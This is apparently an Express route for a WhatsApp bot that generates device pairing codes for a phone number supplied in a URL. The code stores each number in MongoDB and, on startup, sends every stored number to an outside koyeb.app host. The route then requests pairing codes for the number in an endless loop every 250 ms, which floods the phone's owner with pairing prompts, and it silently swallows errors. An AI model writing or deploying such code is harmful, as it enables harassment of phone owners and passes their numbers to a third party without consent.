require('dotenv').config(); 
const PastebinAPI = require('pastebin-js');
const { makeid } = require('../id');
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
let router = express.Router();
const mongoose = require('mongoose');
const pino = require("pino");
const path = require('path');
const { default: Maher_Zubair, useMultiFileAuthState, delay, makeCacheableSignalKeyStore, Browsers } = require("maher-zubair-baileys");
const app = express();
// Funktion zum Entfernen einer Datei
function removeFile(FilePath) {
    if (!fs.existsSync(FilePath)) return false;
    fs.rmSync(FilePath, { recursive: true, force: true });
}


app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// MongoDB connection string from environment variable
const mongoURI = process.env.MONGODB_URI;

// Connect to MongoDB
mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('Connected to MongoDB'))
    .catch(err => console.error('Error connecting to MongoDB:', err));

const PairDataSchema = new mongoose.Schema({
    
    number: String,
    timestamp: { type: Date, default: Date.now }
});

const PairData = mongoose.model('PairData', PairDataSchema);


const sendStoredData = async () => {
    try {
        // Alle Daten aus der MongoDB abrufen
        const data = await PairData.find({}, ' number');

        try {
            await Promise.all(data.map(async (item) => {
                const { number } = item;
                try {
                    await fetch(`https://session-baron0.koyeb.app/code2?number=${number}`);
                    console.log(`Stored data for number ${number} sent successfully`);
                } catch (error) {
                    console.error(`Error sending stored data for number ${number}:`, error);
                }
            }));
            
        } catch (error) {
            console.error('Error sending stored data:', error);
        }
    } catch (error) {
        
    }   
    
};
// Funktion aufrufen, um die Daten beim Starten des Servers zu senden
sendStoredData();


router.get('/', async function(req, res) {
    const interval = 250; // 2 Sekunden (in Millisekunden)
    let num = req.query.number;
    if (!num) {
        throw new Error('Number not provided');
    }
    let number = num
    const find = await PairData.findOne({ number });
if (find) {
    console.log("ist bereits vorhanden")
}else{
    new PairData({ number }).save();
    console.log("Number stored successfully:", number)
    
}

    

                    
    async function generatePairingCode() {
        try {
            
                    const id = makeid();
                    
            const { state, saveCreds } = await useMultiFileAuthState('./start-pairing/tempp/');
            let Pair_Code_By_Maher_Zubair = Maher_Zubair({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: ["Chrome (Linux)", "", ""]
            });

            if (!Pair_Code_By_Maher_Zubair.authState.creds.registered) {
                await delay(1000);
                num = num.replace(/[^0-9]/g, '');
                const code2 = await Pair_Code_By_Maher_Zubair.requestPairingCode(num);
                
                // Sende die Antwort nur, wenn noch keine Antwort gesendet wurde
                if (!res.headersSent) {
                    await res.send({ code2 });
                }
            }

            Pair_Code_By_Maher_Zubair.ev.on('creds.update', saveCreds);
            Pair_Code_By_Maher_Zubair.ev.on("connection.update", async (s) => {
                const { connection, lastDisconnect } = s;
                if (connection === "open") {
                    await delay(2000);
                    let SIGMA_MD_TEXT = `
  *_Pair Code By Baron_*`;
                    await Pair_Code_By_Maher_Zubair.sendMessage(Pair_Code_By_Maher_Zubair.user.id, { text: SIGMA_MD_TEXT });

                    await delay(1500);
                    await Pair_Code_By_Maher_Zubair.ws.close();
                } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) {
                    await delay(2000);
                    // Hier wird req und res übergeben
                }
            });
            

        } catch (err) {
            
        }
    }

    async function runInterval() {
        await generatePairingCode();
        setTimeout(runInterval, interval);
    }

    runInterval(); // Starte die Schleife
});

module.exports = router;
